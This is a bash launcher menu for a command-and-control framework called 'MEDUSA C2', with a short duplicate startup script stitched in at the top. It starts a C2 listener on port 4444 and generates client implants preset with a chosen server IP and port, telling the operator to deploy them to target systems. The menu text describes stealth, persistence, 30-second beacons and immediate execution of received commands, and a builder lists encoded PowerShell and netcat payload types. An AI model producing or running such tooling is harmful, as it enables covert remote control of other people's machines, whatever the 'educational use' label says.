#!/bin/bash

echo "============================================================"
echo "MEDUSA C2 Framework - Startup Script"
echo "Educational Use Only"
echo "============================================================"

echo "Checking Python installation..."
if ! command -v python3 &> /dev/null
then
    echo "Python 3 is not installed"
    echo "Please install Python 3.7 or higher"
    exit 1
fi

echo "Checking/installing required packages..."
pip3 install -r requirements.txt

echo "Starting MEDUSA C2 Framework..."
python3 server.py

# MEDUSA C2 Framework Launcher - Linux/macOS
# Professional Command & Control Framework
# Educational Use Only - Developed for Cybersecurity Training

# Terminal styling
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Clear screen and show header
clear
echo -e "${PURPLE}================================================================${NC}"
echo -e "${WHITE}                   MEDUSA C2 FRAMEWORK v2.1.0${NC}"
echo -e "${WHITE}                Professional Command & Control${NC}"
echo -e "${YELLOW}                    Educational Use Only${NC}"
echo -e "${WHITE}                 Developed for Cybersecurity Training${NC}"
echo -e "${PURPLE}================================================================${NC}"
echo
echo -e "${CYAN}[INFO] System Status: Checking dependencies...${NC}"
echo

# Check Python installation
if command -v python3 &> /dev/null; then
    PYTHON_VERSION=$(python3 --version 2>&1)
    echo -e "${GREEN}[OK] Python detected: $PYTHON_VERSION${NC}"
else
    echo -e "${RED}[ERROR] Python3 not found! Please install Python 3.7+ first.${NC}"
    echo -e "${CYAN}[INFO] Ubuntu/Debian: sudo apt install python3 python3-pip${NC}"
    echo -e "${CYAN}[INFO] CentOS/RHEL: sudo yum install python3 python3-pip${NC}"
    echo -e "${CYAN}[INFO] macOS: brew install python3${NC}"
    echo
    read -p "Press Enter to exit..."
    exit 1
fi

# Check pip installation
if command -v pip3 &> /dev/null; then
    echo -e "${GREEN}[OK] pip3 available${NC}"
else
    echo -e "${YELLOW}[WARNING] pip3 not found, trying pip...${NC}"
    if ! command -v pip &> /dev/null; then
        echo -e "${RED}[ERROR] pip not found! Please install pip first.${NC}"
        exit 1
    fi
fi

# Check Flask installation
echo -e "${CYAN}[INFO] Checking Flask installation...${NC}"
if python3 -c "import flask" 2>/dev/null; then
    echo -e "${GREEN}[OK] Flask available${NC}"
else
    echo -e "${YELLOW}[WARNING] Flask not found. Installing dependencies...${NC}"
    pip3 install flask flask-socketio cryptography || {
        echo -e "${RED}[ERROR] Failed to install dependencies!${NC}"
        exit 1
    }
fi

echo -e "${GREEN}[OK] All dependencies satisfied${NC}"
echo

# Main menu function
show_main_menu() {
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                     MAIN MENU OPTIONS${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "  ${WHITE}[1]${NC} 🚀 Start C2 Server (Web Dashboard + TCP Listener)"
    echo -e "  ${WHITE}[2]${NC} 🔨 Generate Custom Client Payload"
    echo -e "  ${WHITE}[3]${NC} 🔗 Start Client Agent (Background Mode)"
    echo -e "  ${WHITE}[4]${NC} 💻 Start Server (CLI-Only Mode)"
    echo -e "  ${WHITE}[5]${NC} 🔧 Advanced Payload Builder"
    echo -e "  ${WHITE}[6]${NC} 📊 System Information"
    echo -e "  ${WHITE}[7]${NC} 📚 View Documentation"
    echo -e "  ${WHITE}[8]${NC} ❌ Exit Framework"
    echo
}

# Start server function
start_server() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                   STARTING C2 SERVER${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "${CYAN}[INFO] Initializing MEDUSA C2 Server...${NC}"
    echo -e "${CYAN}[INFO] Web Dashboard: http://localhost:5000${NC}"
    echo -e "${CYAN}[INFO] TCP Listener: 0.0.0.0:4444${NC}"
    echo -e "${CYAN}[INFO] Starting with 30-second persistent client mode${NC}"
    echo
    echo -e "${YELLOW}[WARNING] Educational Use Only - Authorized Testing Required!${NC}"
    echo
    python3 server.py
    if [ $? -ne 0 ]; then
        echo
        echo -e "${RED}[ERROR] Server failed to start!${NC}"
        read -p "Press Enter to continue..."
    fi
}

# Generate client function
generate_client() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                 GENERATING CLIENT PAYLOAD${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "${CYAN}[INFO] Creating persistent client with 30-second check-ins${NC}"
    echo
    
    read -p "[INPUT] Enter server IP (default: 127.0.0.1): " server_ip
    server_ip=${server_ip:-127.0.0.1}
    
    read -p "[INPUT] Enter server port (default: 4444): " server_port
    server_port=${server_port:-4444}
    
    read -p "[INPUT] Enter output name (default: medusa_client): " client_name
    client_name=${client_name:-medusa_client}
    
    echo
    echo -e "${CYAN}[INFO] Generating payload with configuration:${NC}"
    echo -e "        - Server IP: ${WHITE}$server_ip${NC}"
    echo -e "        - Server Port: ${WHITE}$server_port${NC}"
    echo -e "        - Output Name: ${WHITE}$client_name${NC}"
    echo -e "        - Persistence: ${WHITE}30-second intervals${NC}"
    echo -e "        - Stealth Mode: ${WHITE}Enabled${NC}"
    echo
    
    echo -e "${CYAN}[PROCESS] Creating customized client...${NC}"
    cp client.py "$client_name.py"
    
    # Replace server configuration in the copied file
    sed -i "s/127\.0\.0\.1/$server_ip/g" "$client_name.py"
    sed -i "s/4444/$server_port/g" "$client_name.py"
    
    if [ -f "$client_name.py" ]; then
        echo -e "${GREEN}[SUCCESS] Client generated successfully!${NC}"
        echo -e "${CYAN}[INFO] File created: $client_name.py${NC}"
        echo -e "${CYAN}[INFO] Deploy this file to target systems${NC}"
        echo -e "${CYAN}[INFO] Client will connect every 30 seconds for persistence${NC}"
        echo
        echo -e "${YELLOW}[DETAILS] Connection Flow:${NC}"
        echo -e "          1. Client attempts connection to $server_ip:$server_port"
        echo -e "          2. Performs initial handshake and registration"
        echo -e "          3. Sends heartbeat every 30 seconds ± jitter"
        echo -e "          4. Executes received commands immediately"
        echo -e "          5. Auto-reconnects on connection loss"
        echo -e "          6. Maintains stealth and persistence"
    else
        echo -e "${RED}[ERROR] Failed to generate client!${NC}"
    fi
    echo
    read -p "Press Enter to continue..."
}

# Start client function
start_client() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                 STARTING CLIENT AGENT${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "${CYAN}[INFO] Starting client in background stealth mode${NC}"
    echo -e "${CYAN}[INFO] Connection interval: 30 seconds (persistent)${NC}"
    echo -e "${CYAN}[INFO] Auto-reconnection: Enabled${NC}"
    echo
    echo -e "${YELLOW}[WARNING] This will start a persistent background agent!${NC}"
    echo -e "${YELLOW}[WARNING] Use only on authorized systems!${NC}"
    echo
    read -p "[CONFIRM] Continue? (y/N): " confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi
    
    echo
    echo -e "${CYAN}[PROCESS] Launching client agent...${NC}"
    python3 client.py &
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[SUCCESS] Client started in background${NC}"
        echo -e "${CYAN}[INFO] Agent is now running with 30-second persistence${NC}"
        echo -e "${CYAN}[INFO] Check server dashboard for connection status${NC}"
        echo -e "${CYAN}[INFO] Process ID: $!${NC}"
    else
        echo -e "${RED}[ERROR] Failed to start client!${NC}"
    fi
    echo
    read -p "Press Enter to continue..."
}

# Start CLI server function
start_cli_server() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                 CLI-ONLY SERVER MODE${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "${CYAN}[INFO] Starting server without web interface${NC}"
    echo -e "${CYAN}[INFO] Command-line interface only${NC}"
    echo
    python3 server.py --cli-only
    if [ $? -ne 0 ]; then
        echo
        echo -e "${RED}[ERROR] CLI server failed to start!${NC}"
        read -p "Press Enter to continue..."
    fi
}

# Advanced builder function
advanced_builder() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                 ADVANCED PAYLOAD BUILDER${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "${CYAN}[INFO] Launching advanced payload builder menu...${NC}"
    echo
    if [ -f "builder.py" ]; then
        python3 builder.py --help
        echo
        echo -e "${YELLOW}[OPTIONS] Available builder commands:${NC}"
        echo -e "  ${WHITE}python3 builder.py --type python --ip <IP> --port <PORT> --output <NAME>${NC}"
        echo -e "  ${WHITE}python3 builder.py --type powershell --ip <IP> --port <PORT> --encode${NC}"
        echo -e "  ${WHITE}python3 builder.py --type netcat --ip <IP> --port <PORT>${NC}"
    else
        echo -e "${RED}[ERROR] Builder module not found!${NC}"
        echo -e "${CYAN}[INFO] Please ensure builder.py exists${NC}"
    fi
    echo
    read -p "Press Enter to continue..."
}

# System info function
show_system_info() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                   SYSTEM INFORMATION${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    
    echo -e "${YELLOW}[SYSTEM] Operating System:${NC}"
    uname -a
    echo
    
    echo -e "${YELLOW}[PYTHON] Version:${NC}"
    python3 --version
    echo
    
    echo -e "${YELLOW}[NETWORK] IP Configuration:${NC}"
    if command -v ip &> /dev/null; then
        ip addr show | grep "inet " | grep -v 127.0.0.1
    elif command -v ifconfig &> /dev/null; then
        ifconfig | grep "inet " | grep -v 127.0.0.1
    else
        echo "Network tools not available"
    fi
    echo
    
    echo -e "${YELLOW}[SECURITY] Firewall Status:${NC}"
    if command -v ufw &> /dev/null; then
        sudo ufw status 2>/dev/null || echo "UFW status check requires sudo"
    elif command -v firewall-cmd &> /dev/null; then
        firewall-cmd --state 2>/dev/null || echo "Firewalld status check failed"
    else
        echo "Firewall tools not available"
    fi
    echo
    
    echo -e "${YELLOW}[MEDUSA] Framework Status:${NC}"
    if [ -f "server.py" ]; then
        echo -e "${GREEN}[OK] Server module available${NC}"
    else
        echo -e "${RED}[ERROR] Server module missing!${NC}"
    fi
    if [ -f "client.py" ]; then
        echo -e "${GREEN}[OK] Client module available${NC}"
    else
        echo -e "${RED}[ERROR] Client module missing!${NC}"
    fi
    echo
    read -p "Press Enter to continue..."
}

# Documentation function
show_documentation() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                     DOCUMENTATION${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    
    echo -e "${YELLOW}[DOCS] Available Documentation:${NC}"
    echo
    if [ -f "README.md" ]; then
        echo -e "${GREEN}[OK] README.md - Main documentation${NC}"
    else
        echo -e "${RED}[MISSING] README.md${NC}"
    fi
    if [ -f "BUILDER_GUIDE.md" ]; then
        echo -e "${GREEN}[OK] BUILDER_GUIDE.md - Payload building guide${NC}"
    else
        echo -e "${RED}[MISSING] BUILDER_GUIDE.md${NC}"
    fi
    echo
    
    echo -e "${YELLOW}[URLS] Online Resources:${NC}"
    echo -e "        - GitHub: https://github.com/medusa-c2/medusa"
    echo -e "        - Documentation: https://medusa-c2.readthedocs.io"
    echo -e "        - Discord: https://discord.gg/medusa-c2"
    echo
    
    echo -e "${YELLOW}[HELP] Command Line Usage:${NC}"
    echo -e "        python3 server.py [--help]"
    echo -e "        python3 client.py [--help]"
    echo -e "        python3 builder.py [--help]"
    echo
    
    read -p "[OPTION] View README.md? (y/N): " view_readme
    if [[ "$view_readme" =~ ^[Yy]$ ]]; then
        if [ -f "README.md" ]; then
            echo
            echo -e "${CYAN}[INFO] Opening README.md...${NC}"
            if command -v less &> /dev/null; then
                less README.md
            elif command -v more &> /dev/null; then
                more README.md
            else
                cat README.md
            fi
        else
            echo -e "${RED}[ERROR] README.md not found!${NC}"
        fi
    fi
    echo
    read -p "Press Enter to continue..."
}

# Exit function
exit_framework() {
    clear
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${WHITE}                  EXITING MEDUSA C2${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo
    echo -e "${CYAN}[INFO] Thank you for using MEDUSA C2 Framework!${NC}"
    echo -e "${YELLOW}[REMINDER] Educational use only - Stay ethical!${NC}"
    echo -e "${CYAN}[CONTACT] Report issues: https://github.com/medusa-c2/medusa/issues${NC}"
    echo
    
    echo -e "${CYAN}[CLEANUP] Checking for running processes...${NC}"
    # Check for running Python processes that might be MEDUSA
    PYTHON_PROCS=$(pgrep -f "python.*\(server\|client\)\.py" 2>/dev/null || true)
    if [ ! -z "$PYTHON_PROCS" ]; then
        echo -e "${YELLOW}[WARNING] MEDUSA processes detected:${NC}"
        ps -f -p $PYTHON_PROCS 2>/dev/null || true
        read -p "[OPTION] Terminate MEDUSA processes? (y/N): " kill_processes
        if [[ "$kill_processes" =~ ^[Yy]$ ]]; then
            echo -e "${CYAN}[PROCESS] Terminating MEDUSA processes...${NC}"
            kill $PYTHON_PROCS 2>/dev/null || true
            sleep 2
            # Force kill if still running
            REMAINING=$(pgrep -f "python.*\(server\|client\)\.py" 2>/dev/null || true)
            if [ ! -z "$REMAINING" ]; then
                echo -e "${YELLOW}[WARNING] Force killing remaining processes...${NC}"
                kill -9 $REMAINING 2>/dev/null || true
            fi
            echo -e "${GREEN}[SUCCESS] MEDUSA processes terminated${NC}"
        fi
    fi
    echo
    echo -e "${GREEN}[GOODBYE] MEDUSA C2 Framework terminated${NC}"
    echo
    exit 0
}

# Main loop
while true; do
    show_main_menu
    read -p "[MEDUSA] Select option (1-8): " choice
    echo
    
    case $choice in
        1)
            start_server
            ;;
        2)
            generate_client
            ;;
        3)
            start_client
            ;;
        4)
            start_cli_server
            ;;
        5)
            advanced_builder
            ;;
        6)
            show_system_info
            ;;
        7)
            show_documentation
            ;;
        8)
            exit_framework
            ;;
        *)
            echo -e "${RED}[ERROR] Invalid choice. Please try again.${NC}"
            echo
            read -p "Press Enter to continue..."
            ;;
    esac
done